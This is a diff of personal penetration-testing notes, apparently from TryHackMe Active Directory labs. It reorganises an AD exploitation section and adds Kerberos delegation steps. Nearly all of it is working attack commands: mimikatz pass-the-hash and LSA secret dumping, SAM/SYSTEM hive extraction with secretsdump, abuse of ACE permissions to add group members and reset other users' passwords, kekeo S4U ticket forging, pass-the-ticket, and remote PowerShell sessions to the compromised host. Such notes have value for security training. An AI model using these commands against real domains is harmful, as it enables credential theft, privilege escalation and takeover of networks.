@@ -219,22 +219,7 @@
         $mimikatz # sekurlas::pth /user:$Aministror /domain:inmy.com /ntlm <hash> /run:PowerShell.exe
       
   ### AD
-    #### explode AD
-      ACE access control entries  //use in AD
-            ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
-            AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
-            GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
-            GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
-            WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
-            WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
-            AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
-      //use sharphound get  infor of AD, bloodhound to get a path, and the ACE we can use.
-        Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
-        Get-ADGroupMember -Identity "IT Support"  //add new member to a gourp 
-      // change passwd of a user in a target group
-      $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
-      Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password
-      gpupdate /force
+   
     #### pass the hash
       //use mimikatz load hash in the memory, and get the session of this user.
       mimikatz # privilege::debug
@@ -347,4 +332,41 @@
             reg save HKLM\system C:\users\Administrator\Desktop\system-reg
           3. use .py to decypted
             python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
-          
+   #### explode AD
+     Exploiting Permission Delegation
+      ACE access control entries  //use in AD
+            ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
+            AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
+            GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
+            GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
+            WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
+            WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
+            AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
+      //use sharphound get  infor of AD, bloodhound to get a path, and the ACE we can use.
+        Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
+        Get-ADGroupMember -Identity "IT Support"  //add new member to a gourp 
+      // change passwd of a user in a target group
+      $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
+      Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password 
+      gpupdate /force // wait until the privi updated.
+      
+    Exploiting Kerberos Delegation
+      Import-Module C:\Tools\PowerView.ps1 
+      Get-NetUser -TrustedToAuth  //to find privileged user for the network, we find svcIIS here. and get the plain text passwd
+
+      mimikatz # token::elevate  //admin privi required, we have tir2_xxx account
+      lsadump::secrets
+                token::elevate - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
+                lsadump::secrets - Mimikatz interacts with the registry hive to pull the clear text credentials.
+      
+      kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:xxx //kekeo to create tgt and tgs
+      kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
+      kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
+
+      mimikatz # privilege::debug  //mimikatz to import the tgs
+      mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi 
+      exit and klist to check whterh the tgs loaded.
+
+
+      PS C:> New-PSSession -ComputerName thmserver1.za.tryhackme.loc
+      PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc  //ssh to the target host.
